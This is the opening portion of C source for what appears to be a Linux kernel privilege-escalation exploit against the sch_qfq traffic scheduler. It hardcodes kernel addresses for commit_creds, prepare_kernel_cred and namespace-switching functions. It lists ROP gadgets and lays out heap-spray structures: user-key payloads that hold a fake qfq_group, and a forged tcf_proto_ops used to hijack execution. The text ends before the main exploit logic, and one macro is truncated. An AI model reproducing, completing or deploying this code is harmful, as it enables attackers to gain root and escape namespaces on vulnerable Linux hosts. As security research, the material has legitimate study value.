#define _GNU_SOURCE
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/keyctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/if_packet.h>
#include <linux/pkt_cls.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>
#include <netinet/in.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;

_Static_assert (sizeof(u8) == 1, "sizeof(u8) != 1");
_Static_assert (sizeof(u16) == 2, "sizeof(u16) != 2");
_Static_assert (sizeof(u32) == 4, "sizeof(u32) != 4");
_Static_assert (sizeof(u64) == 8, "sizeof(u64) != 8");
_Static_assert (sizeof(i8) == 1, "sizeof(i8) != 1");
_Static_assert (sizeof(i16) == 2, "sizeof(i16) != 2");
_Static_assert (sizeof(i32) == 4, "sizeof(i32) != 4");
_Static_assert (sizeof(i64) == 8, "sizeof(i64) != 8");

#define L(fmt, ...) printf("INFO: " fmt "\n", ##__VA_ARGS__)
#define E(fmt, ...) printf("ERROR: " fmt "\n", ##__VA_ARGS__)

#define FAIL_IF(x) if ((x)) { \
    perror(#x); \
    return -1; \
}

#define pad4(x) (u8)x, (u8)x, (u8)x, (u8)x
#define pad8(x) pad4(x), pad4(x)

#define p64(x) (u8)(((x) >> 0) & 0xFF), \

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define PACK __attribute__((__packed__))

#define __EVENT_SET 0
#define __EVENT_UNSET 1

#define EVENT_DEFINE(name, init) volatile int name = init
#define EVENT_WAIT(name) while (__atomic_exchange_n(&name, __EVENT_UNSET, __ATOMIC_ACQUIRE) != __EVENT_SET) { usleep(1000); }

#define EVENT_UNSET(name) __atomic_store_n(&name, __EVENT_UNSET, __ATOMIC_RELEASE)
#define EVENT_SET(name) __atomic_store_n(&name, __EVENT_SET, __ATOMIC_RELEASE)

// GADGETS {

u64 cls_rsvp_ops = 0xffffffff8395e320;

u64 find_task_by_vpid = 0xffffffff811b5670;
u64 switch_task_namespaces = 0xffffffff811bd1f0;
u64 commit_creds = 0xffffffff811bed80;
u64 prepare_kernel_cred = 0xffffffff811bf020;
u64 init_task = 0xffffffff83615a40;
u64 init_nsproxy = 0xffffffff836765c0;

u64 ___trampoline_start_iretq = 0xffffffff822010c6;

u64 mov_rdi_rax = 0xffffffff810eb083; // mov rdi, rax; mov rax, rdx; xor edx, edx; div rcx; mov rdx, [rip+0x315da13]; add rax, rdi; jmp zen_untrain_ret+1 (0xffffffff82404440) {taken}; ret // 4889c74889d031d248f7f1488b1513da15034801f8e9c3223c01c3
u64 pop_rcx_ret = 0xffffffff810271ec; // pop rcx; ret // 59c3
u64 pop_rsi = 0xffffffff8100256c; // pop rsi; jmp zen_untrain_ret+1 (0xffffffff82404440) {taken}; ret // 5ee9ce1e4001c3
u64 pop_rdi = 0xffffffff81002cd5; // pop rdi; jmp zen_untrain_ret+1 (0xffffffff82404440) {taken}; ret // 5fe97e094001c3

u64 mov_rax_rdi_jmp_zen_ret = 0xffffffff810fdd45; // mov rax, rdi; jmp zen_untrain_ret+1 (0xffffffff82404440) {taken}; ret // 4889f8e991414001c3

u64 push_rsi_jmp_rsi_0x39 = 0xffffffff8198915b; // push rsi; jmp qword ptr [rsi+0x39] {taken} // 56ff6639
u64 pop_rsp_add_rsp_0x18_pop_rbx_pop_rbp_pop_r12_jmp_zen_ret = 0xffffffff810e8603; // pop rsp; add rsp, 0x18; pop rbx; pop rbp; pop r12; jmp zen_untrain_ret+1 (0xffffffff82404440) {taken}; ret // 5c4883c4185b5d415ce94f4d3c01c3
u64 mov_rsp_rbp_pop_rbp_ret = 0xffffffff8112cf2c; // mov rsp, rbp; pop rbp; ret // 4889ec5dc3

// } GADGETS

#define FOR_ALL_OFFSETS(x) do { \
    x(cls_rsvp_ops); \
    x(find_task_by_vpid); \
    x(switch_task_namespaces); \
    x(commit_creds); \
    x(prepare_kernel_cred); \
    x(init_task); \
    x(init_nsproxy); \
    x(___trampoline_start_iretq); \
    x(mov_rdi_rax); \
    x(pop_rcx_ret); \
    x(pop_rsi); \
    x(pop_rdi); \
    x(mov_rax_rdi_jmp_zen_ret); \
    x(push_rsi_jmp_rsi_0x39); \
    x(pop_rsp_add_rsp_0x18_pop_rbx_pop_rbp_pop_r12_jmp_zen_ret); \
    x(mov_rsp_rbp_pop_rbp_ret); \
  } while(0)

// Reverse calculation of the index in sch_qfq.c:qfq_calc_index
// Our desired index will be 27 so that the fake group resides at offset 288 into
// our large spray object.
#define _TARGET_INDEX 27
#define _MIN_SLOT_SHIFT 25
#define _NUM_CLS 1
#define _CLS_WEIGHT 1
#define _ONE_FP 0x40000000
#define LMAX ((1ull << (_TARGET_INDEX + _MIN_SLOT_SHIFT - 1 + 1)) / (_ONE_FP / (_CLS_WEIGHT * _NUM_CLS)) / _NUM_CLS)

#define SPRAY_8192 1
#define SPRAY_128 2

#define SIZEOF_USER_KEY_PAYLOAD 24

struct list_head {
  struct list_head *         next;                 /*     0     8 */
  struct list_head *         prev;                 /*     8     8 */

  /* size: 16, cachelines: 1, members: 2 */
  /* last cacheline: 16 bytes */
};

struct hlist_node {
  struct hlist_node *        next;                 /*     0     8 */
  struct hlist_node * *      pprev;                /*     8     8 */

  /* size: 16, cachelines: 1, members: 2 */
  /* last cacheline: 16 bytes */
};

struct qfq_aggregate_partial {
  // struct hlist_node          next;                 /*     0    16 */
  // u64                        S;                    /*    16     8 */
  u64                        F;                    /*    24     8 */
  struct qfq_group *         grp;                  /*    32     8 */
  u32                        class_weight;         /*    40     4 */
  int                        lmax;                 /*    44     4 */
  u32                        inv_w;                /*    48     4 */
  u32                        budgetmax;            /*    52     4 */
  u32                        initial_budget;       /*    56     4 */
  u32                        budget;               /*    60     4 */
  /* --- cacheline 1 boundary (64 bytes) --- */
  int                        num_classes;          /*    64     4 */

  u8 __pad0[4]; /* XXX 4 bytes hole, try to pack */

  struct list_head           active;               /*    72    16 */
  struct hlist_node          nonfull_next;         /*    88    16 */

  /* size: 104, cachelines: 2, members: 13 */
  /* sum members: 100, holes: 1, sum holes: 4 */
  /* last cacheline: 40 bytes */
} PACK;
_Static_assert(sizeof(struct qfq_aggregate_partial) == 104 - SIZEOF_USER_KEY_PAYLOAD);

struct tcf_proto_partial {
  // void*         next;                 /*     0     8 */
  // void *                     root;                 /*     8     8 */
  // int                        (*classify)(struct sk_buff *, const struct tcf_proto  *, struct tcf_result *); /*    16     8 */
  u16                     protocol;             /*    24     2 */

  /* XXX 2 bytes hole, try to pack */
  u8 __pad0[2];

  u32                        prio;                 /*    28     4 */
  void *                     data;                 /*    32     8 */
  const void  * ops;               /*    40     8 */
  struct tcf_chain *         chain;                /*    48     8 */
  u32                 lock;                 /*    56     4 */
  u8                       deleting;             /*    60     1 */

  /* XXX 3 bytes hole, try to pack */
  u8 __pad1[3];

  /* --- cacheline 1 boundary (64 bytes) --- */
  u32                 refcnt;               /*    64     4 */

  /* XXX 4 bytes hole, try to pack */
  u8 __pad2[4];

  u8       rcu[16];
  struct hlist_node          destroy_ht_node;      /*    88    16 */

  /* size: 104, cachelines: 2, members: 13 */
  /* sum members: 95, holes: 3, sum holes: 9 */
  /* forced alignments: 1, forced holes: 1, sum forced holes: 4 */
  /* last cacheline: 40 bytes */
} PACK;
_Static_assert(sizeof(struct tcf_proto_partial) == 104 - SIZEOF_USER_KEY_PAYLOAD);


struct tcf_proto_ops {
  struct list_head           head;                 /*     0    16 */
  char                       kind[16];             /*    16    16 */
  int                        (*classify)(void*, const void*, void*); /*    32     8 */
  int                        (*init)(void*); /*    40     8 */
  void                       (*destroy)(void*, u8, void*); /*    48     8 */
  void *                     (*get)(void*, u32); /*    56     8 */
  /* --- cacheline 1 boundary (64 bytes) --- */
  void                       (*put)(void*, void *); /*    64     8 */
  int                        (*change)(void*, void*, void*, long unsigned int, u32, void**, void **, u32, void*); /*    72     8 */
  int                        (*delete)(void*, void*, u8*, u8, void*); /*    80     8 */
  u8                       (*delete_empty)(void*); /*    88     8 */
  void                       (*walk)(void*, void*, u8); /*    96     8 */
  int                        (*reoffload)(void*, u8, void *, void *, void*); /*   104     8 */
  void                       (*hw_add)(void*, void *); /*   112     8 */
  void                       (*hw_del)(void*, void *); /*   120     8 */
  /* --- cacheline 2 boundary (128 bytes) --- */
  void                       (*bind_class)(void *, u32, long unsigned int, void *, long unsigned int); /*   128     8 */
  void *                     (*tmplt_create)(void*, void*, void**, void*); /*   136     8 */
  void                       (*tmplt_destroy)(void *); /*   144     8 */
  int                        (*dump)(void*, void*, void *, void*, void*, u8); /*   152     8 */
  int                        (*terse_dump)(void*, void*, void *, void*, void*, u8); /*   160     8 */
  int                        (*tmplt_dump)(void*, void*, void *); /*   168     8 */
  struct module *            owner;                /*   176     8 */
  int                        flags;                /*   184     4 */

  /* size: 192, cachelines: 3, members: 22 */
  /* padding: 4 */
} PACK;

struct hlist_head {
  struct hlist_node *        first;                /*     0     8 */

  /* size: 8, cachelines: 1, members: 1 */
  /* last cacheline: 8 bytes */
};

struct qfq_group {
  u64                        S;                    /*     0     8 */
  u64                        F;                    /*     8     8 */
  unsigned int               slot_shift;           /*    16     4 */
  unsigned int               index;                /*    20     4 */
  unsigned int               front;                /*    24     4 */

  u8 __pad0[4]; /* XXX 4 bytes hole, try to pack */

  long unsigned int          full_slots;           /*    32     8 */
  struct hlist_head          slots[32];            /*    40   256 */

  /* size: 296, cachelines: 5, members: 7 */
  /* sum members: 292, holes: 1, sum holes: 4 */
  /* last cacheline: 40 bytes */
} PACK;

typedef i32 key_serial_t;

struct key {
  key_serial_t id;
  int type;
};

long keyctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);

struct rop_payload_head {
  struct tcf_proto_ops ops;
  u8 stack[0];
} PACK;

// Large spray payload (kmalloc-8192)
// This will host the fake qfq_group object in stage 1
// Eventually it will contain both the prepared stack and the tcf_proto_ops
// which the fake tcf_proto will reference
struct key_payload_large {
  struct {
    u8 __pad02[288 - SIZEOF_USER_KEY_PAYLOAD];
    struct qfq_group group;
  } PACK;
  struct rop_payload_head rop;
  u8 __pad2[4097 - sizeof(struct qfq_group) - 288 - sizeof(struct rop_payload_head)];
} PACK;
_Static_assert(sizeof(struct key_payload_large) == 4097 - SIZEOF_USER_KEY_PAYLOAD);
